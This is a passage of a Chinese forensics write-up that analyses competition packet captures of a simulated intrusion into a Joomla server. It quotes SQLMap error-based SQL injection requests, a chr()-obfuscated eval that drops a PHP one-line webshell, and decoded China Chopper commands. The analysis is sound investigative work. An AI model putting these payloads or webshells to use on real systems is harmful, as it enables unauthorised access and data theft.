class="hljs-number">11</span>.黑客第一次获取到当前目录下的文件列表的漏洞利用请求发生在什么时候<br><span class="hljs-number">12</span>.黑客在内网主机中添加的用户名和密码是多少<br><span class="hljs-number">13</span>.黑客从内网服务器中下载下来的文件名<br></code></pre></td></tr></table></figure><h2 id="3-数据包分析过程"><a href="#3-数据包分析过程" class="headerlink" title="3. 数据包分析过程"></a>3. 数据包分析过程</h2><p>由题干中<code>SQL注入</code>等关键词，猜测黑客第一个攻击的是<code>Web</code>服务。打开第一个数据包，过滤<code>http</code>，往后翻一翻，可以看到</p><p><img src="https://image.mengsec.com/2018.5.5-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/1.png" alt="1"></p><p>可知黑客IP为:<code>202.1.1.2 </code>第一个受害主机IP为<code>192.168.1.8</code></p><p>黑客使用的工具是<code>SQLMap</code>,注入的参数是<code>list[select]</code></p><p>构造个过滤规则</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">http</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">202</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><p>过滤之后可以看到在<code>No.26416</code>之后黑客开始进行<code>SQL注入</code>。</p><p>往下一直翻一翻响应，可知第一个受害主机的表前缀是<code>ajtuc_</code>。</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">http</span> contains <span class="hljs-string">&quot;ajtuc_&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">202</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><p>翻到后面，随便找一个<code>Payload</code>,可以知道进行了报错注入</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Request URI Query Parameter [truncated]: list[<span class="hljs-keyword">select</span>]=(UPDATEXML(<span class="hljs-number">6315</span>,CONCAT(<span class="hljs-number">0x2e</span>,<span class="hljs-number">0x71717a7671</span>,(<span class="hljs-keyword">SELECT</span> MID((IFNULL(CAST(username <span class="hljs-keyword">AS</span> <span class="hljs-type">CHAR</span>),<span class="hljs-number">0x20</span>)),<span class="hljs-number">1</span>,<span class="hljs-number">22</span>) <span class="hljs-keyword">FROM</span> joomla.ajtuc_users <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> id<br></code></pre></td></tr></table></figure><p>可知数据库库名是<code>joomla</code></p><p>猜测黑客应该是是从数据库中拿到的网站后台的密码。</p><p>第一种方法分析黑客进行<code>SQL注入</code>的数据可以知道黑客获得的数据。</p><p>第二种黑客有可能会登录<code>joomla</code>的后台。如果能找到黑客登录时的流量，就能直接获取管理员密码。</p><p>首先寻找黑客登录的包</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">http</span> contains <span class="hljs-string">&quot;administrator&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">202</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">8</span><br>(http contains <span class="hljs-string">&quot;login&quot;</span> <span class="hljs-title">||</span> http contains <span class="hljs-string">&quot;log in&quot;</span>)<span class="hljs-keyword">and</span> <span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">202</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><p>没找到。。</p><p>找数据库<code>user</code>表里的数据。</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">http</span> contains <span class="hljs-string">&quot;joomla.ajtuc_users&quot;</span> <span class="hljs-keyword">and</span> http contains <span class="hljs-string">&quot;password&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">202</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/2018.5.5-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/2.png" alt="2"></p><p>可以看到有三条数据。</p><p>请求</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">202.1.1.1:8000</span>/index.php?option=com_contenthistory&amp;view=history&amp;list[ordering]=&amp;item_id=<span class="hljs-number">1</span>&amp;type_id=<span class="hljs-number">1</span>&amp;list[select]=(UPDATEXML(<span class="hljs-number">5928</span>,CONCAT(<span class="hljs-number">0</span>x<span class="hljs-number">2</span>e,<span class="hljs-number">0</span>x<span class="hljs-number">71717</span>a<span class="hljs-number">7671</span>,(SELECT MID((IFNULL(CAST(password AS CHAR),<span class="hljs-number">0</span>x<span class="hljs-number">20</span>)),<span class="hljs-number">1</span>,<span class="hljs-number">22</span>) FROM joomla.ajtuc_users ORDER BY id LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0</span>x<span class="hljs-number">71716</span>b<span class="hljs-number">6</span>b<span class="hljs-number">71</span>),<span class="hljs-number">7096</span>))<br></code></pre></td></tr></table></figure><p>响应</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Status</span>: <span class="hljs-number">500</span> XPATH syntax error: &#x27;qqzvq$<span class="hljs-number">2</span>y$<span class="hljs-number">10</span>$lXujU<span class="hljs-number">7</span>XaUviJDigqqkkq&#x27; SQL=SELECT (UPDATEXML(<span class="hljs-number">5928</span>,CONCAT(<span class="hljs-number">0</span>x<span class="hljs-number">2</span>e,<span class="hljs-number">0</span>x<span class="hljs-number">71717</span>a<span class="hljs-number">7671</span>,(SELECT MID((IFNULL(CAST(password AS CHAR),<span class="hljs-number">0</span>x<span class="hljs-number">20</span>)),<span class="hljs-number">1</span>,<span class="hljs-number">22</span>) FROM joomla.ajtuc_users ORDER BY id LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0</span>x<span class="hljs-number">71716</span>b<span class="hljs-number">6</span>b<span class="hljs-number">71</span>),<span class="hljs-number">7096</span>)),uc.name AS editor FROM `ajtuc_ucm_history` AS h LEFT JOIN ajtuc_users AS uc <span class="hljs-literal">ON</span> uc.id = h.editor_user_id WHERE `h`.`ucm_item_id` = <span class="hljs-number">1</span> AND `h`.`ucm_type_id` = <span class="hljs-number">1</span> ORDER BY `h`.`save_date`<br></code></pre></td></tr></table></figure><p>请求</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">202.1.1.1:8000</span>/index.php?option=com_contenthistory&amp;view=history&amp;list[ordering]=&amp;item_id=<span class="hljs-number">1</span>&amp;type_id=<span class="hljs-number">1</span>&amp;list[select]=(UPDATEXML(<span class="hljs-number">3613</span>,CONCAT(<span class="hljs-number">0</span>x<span class="hljs-number">2</span>e,<span class="hljs-number">0</span>x<span class="hljs-number">71717</span>a<span class="hljs-number">7671</span>,(SELECT MID((IFNULL(CAST(password AS CHAR),<span class="hljs-number">0</span>x<span class="hljs-number">20</span>)),<span class="hljs-number">23</span>,<span class="hljs-number">22</span>) FROM joomla.ajtuc_users ORDER BY id LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0</span>x<span class="hljs-number">71716</span>b<span class="hljs-number">6</span>b<span class="hljs-number">71</span>),<span class="hljs-number">7939</span>))<br></code></pre></td></tr></table></figure><p>响应</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[truncated]\t&lt;title&gt;Error: <span class="hljs-number">500</span> XPATH syntax error: &amp;#<span class="hljs-number">039</span>;qqzvqFMzKy6.wx7EMCBqpzrJdn7qqkkq&amp;#<span class="hljs-number">039</span>; <span class="hljs-keyword">SQL</span>=<span class="hljs-keyword">SELECT</span> (UPDATEXML(<span class="hljs-number">3613</span>,CONCAT(<span class="hljs-number">0x2e</span>,<span class="hljs-number">0x71717a7671</span>,(<span class="hljs-keyword">SELECT</span> MID((IFNULL(CAST(<span class="hljs-keyword">password</span> <span class="hljs-keyword">AS</span> <span class="hljs-type">CHAR</span>),<span class="hljs-number">0x20</span>)),<span class="hljs-number">23</span>,<span class="hljs-number">22</span>) <span class="hljs-keyword">FROM</span> joomla.ajtuc_users <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span><br></code></pre></td></tr></table></figure><p>请求</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">202.1.1.1:8000</span>/index.php?option=com_contenthistory&amp;view=history&amp;list[ordering]=&amp;item_id=<span class="hljs-number">1</span>&amp;type_id=<span class="hljs-number">1</span>&amp;list[select]=(UPDATEXML(<span class="hljs-number">8949</span>,CONCAT(<span class="hljs-number">0</span>x<span class="hljs-number">2</span>e,<span class="hljs-number">0</span>x<span class="hljs-number">71717</span>a<span class="hljs-number">7671</span>,(SELECT MID((IFNULL(CAST(password AS CHAR),<span class="hljs-number">0</span>x<span class="hljs-number">20</span>)),<span class="hljs-number">45</span>,<span class="hljs-number">22</span>) FROM joomla.ajtuc_users ORDER BY id LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0</span>x<span class="hljs-number">71716</span>b<span class="hljs-number">6</span>b<span class="hljs-number">71</span>),<span class="hljs-number">3079</span>))<br></code></pre></td></tr></table></figure><p>响应</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[truncated]Status: <span class="hljs-number">500</span> XPATH syntax error: <span class="hljs-string">&#x27;qqzvqzi/8B2QRD7qIlDJeqqkkq&#x27;</span> <span class="hljs-keyword">SQL</span>=<span class="hljs-keyword">SELECT</span> (UPDATEXML(<span class="hljs-number">8949</span>,CONCAT(<span class="hljs-number">0x2e</span>,<span class="hljs-number">0x71717a7671</span>,(<span class="hljs-keyword">SELECT</span> MID((IFNULL(CAST(<span class="hljs-keyword">password</span> <span class="hljs-keyword">AS</span> <span class="hljs-type">CHAR</span>),<span class="hljs-number">0x20</span>)),<span class="hljs-number">45</span>,<span class="hljs-number">22</span>) <span class="hljs-keyword">FROM</span> joomla.ajtuc_users <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> id <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x71716b6</span><br></code></pre></td></tr></table></figure><p>可以拼接出密文</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$2y$10$lXujU7XaUviJDigFMzKy6.wx7EMCBqpzrJdn7zi/<span class="hljs-number">8</span>B2QRD7qIlDJe<br></code></pre></td></tr></table></figure><p>But…网上找了一堆解密方法失败，暂且跳过吧，哎。。</p><p>再过滤一下</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">http</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">202</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><p>翻到后面</p><p><code>No.607927</code></p><p><code>follow</code>一下<code>TCP</code>流</p><p><img src="https://image.mengsec.com/2018.5.5-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/3.png" alt="3"></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-built_in">eval</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-number">102</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">105</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">108</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">101</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">112</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">117</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">116</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">99</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">111</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">110</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">116</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">101</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">110</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">116</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">40</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">100</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">105</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">114</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">110</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">109</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">101</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">40</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">36</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">83</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">69</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">82</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">86</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">69</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">82</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">91</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">39</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">83</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">67</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">82</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">73</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">80</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">84</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">70</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">73</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">76</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">69</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">78</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">65</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">77</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">69</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">39</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">93</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">41</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">46</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">39</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">47</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">107</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">107</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">107</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">46</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">112</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">104</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">112</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">39</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">44</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">98</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">101</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">54</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">52</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">100</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">101</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">99</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">111</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">100</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">101</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">40</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">39</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">100</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">110</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">90</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">50</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">80</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">68</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">57</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">119</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">72</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">65</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">103</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">90</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">88</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">90</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">104</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">98</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">67</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">103</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">107</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">88</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">49</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">66</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">80</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">85</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">49</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">82</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">98</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">101</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">110</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">112</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">54</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">88</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">83</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">107</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">55</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">80</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">122</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">52</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">61</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">39</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">41</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">41</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">59</span>))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>解码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">file_put_contents(dirname(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SCRIPT_FILENAME&#x27;</span>]).<span class="hljs-string">&#x27;/kkkaaa.php&#x27;</span>,base64_decode(<span class="hljs-string">&#x27;dnZ2PD9waHAgZXZhbCgkX1BPU1Rbenp6XSk7Pz4=&#x27;</span>));<br><br>dnZ2PD9waHAgZXZhbCgkX1BPU1Rbenp6XSk7Pz4=<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[zzz]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可知黑客第一次获得的<code>PHP</code>木马的密码是<code>zzz</code></p><p>后面就没什么了，打开第二个数据包</p><p><img src="https://image.mengsec.com/2018.5.5-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/4.png" alt="4"></p><p>很明显前几个黑客使用菜刀连接了一句话木马，分别追踪查看命令。</p><p><code>No.47740</code></p><p>请求</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">z<span class="hljs-number">0</span>=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi<span class="hljs-number">0</span>+fCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw==<br><br>@ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>);@set_time_limit(<span class="hljs-number">0</span>);@set_magic_quotes_runtime(<span class="hljs-number">0</span>);echo(<span class="hljs-string">&quot;-&gt;|&quot;</span>);;$D=dirname($_SERVER[<span class="hljs-string">&quot;SCRIPT_FILENAME&quot;</span>]);<span class="hljs-keyword">if</span>($D==<span class="hljs-string">&quot;&quot;</span>)$D=dirname($_SERVER[<span class="hljs-string">&quot;PATH_TRANSLATED&quot;</span>]);$R=<span class="hljs-string">&quot;&#123;$D&#125;\t&quot;</span>;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">substr</span>($D,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)!=<span class="hljs-string">&quot;/&quot;</span>)&#123;<span class="hljs-keyword">foreach</span>(range(<span class="hljs-string">&quot;A&quot;</span>,<span class="hljs-string">&quot;Z&quot;</span>) as $L)<span class="hljs-keyword">if</span>(is_dir(<span class="hljs-string">&quot;&#123;$L&#125;:&quot;</span>))$R.=<span class="hljs-string">&quot;&#123;$L&#125;:&quot;</span>;&#125;$R.=<span class="hljs-string">&quot;\t&quot;</span>;$u=(function_exists(<span class="hljs-string">&#x27;posix_getegid&#x27;</span>))?@posix_getpwuid(@posix_geteuid()):<span class="hljs-string">&#x27;&#x27;</span>;$usr=($u)?$u[<span class="hljs-string">&#x27;name&#x27;</span>]:@get_current_user();$R.=php_uname();$R.=<span class="hljs-string">&quot;(&#123;$usr&#125;)&quot;</span>;<span class="hljs-keyword">print</span> $R;;echo(<span class="hljs-string">&quot;|&lt;-&quot;</span>);<span class="hljs-keyword">die</span>();<br></code></pre></td></tr></table></figure><p>响应</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">vvv</span>-&gt;|/var/www/html/joomla\t\tLinux simple <span class="hljs-number">3</span>.<span class="hljs-number">10</span>.<span class="hljs-number">0</span>-<span class="hljs-number">693</span>.<span class="hljs-number">5</span>.<span class="hljs-number">2</span>.el<span class="hljs-number">7</span>.x<span class="hljs-number">86</span>_<span class="hljs-number">64</span> #<span class="hljs-number">1</span> SMP Fri Oct <span class="hljs-number">20</span> <span class="hljs-number">20</span>:<span class="hljs-number">32</span>:<span class="hljs-number">50</span> UTC <span class="hljs-number">2017</span> x<span class="hljs-number">86</span>_<span class="hljs-number">64</span>(apache)|&lt;-<br></code></pre></td></tr></table></figure><p><code>No.232811</code></p><p>很明显传了一个文件上去。</p><p>请求</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gcode">&amp;zzz=<span class="hljs-meta">%</span><span class="hljs-number">40</span>eval<span class="hljs-meta">%</span><span class="hljs-number">01</span><span class="hljs-meta">%</span><span class="hljs-number">28</span>base<span class="hljs-number">64</span>_decode<span class="hljs-meta">%</span><span class="hljs-number">28</span><span class="hljs-meta">%</span><span class="hljs-number">24</span>_POST<span class="hljs-meta">%</span><span class="hljs-number">5</span>Bz<span class="hljs-number">0</span><span class="hljs-meta">%</span><span class="hljs-number">5</span>D<span class="hljs-meta">%</span><span class="hljs-number">29</span><span class="hljs-meta">%</span><span class="hljs-number">29</span><span class="hljs-meta">%</span><span class="hljs-number">3</span>B<br><br>&amp;z<span class="hljs-number">0</span>=QGluaV<span class="hljs-number">9</span>zZXQoImRpc<span class="hljs-number">3</span>BsYXlfZXJyb<span class="hljs-number">3</span>JzIiwiMCIp<span class="hljs-meta">O0</span>BzZXRfdGltZV<span class="hljs-number">9</span>saW<span class="hljs-number">1</span>pdCgwKTtAc<span class="hljs-number">2</span>V<span class="hljs-number">0</span>X<span class="hljs-number">21</span>hZ<span class="hljs-number">2</span>ljX<span class="hljs-number">3</span>F<span class="hljs-number">1</span>b<span class="hljs-number">3</span>Rlc<span class="hljs-number">19</span>ydW<span class="hljs-number">50</span>aW<span 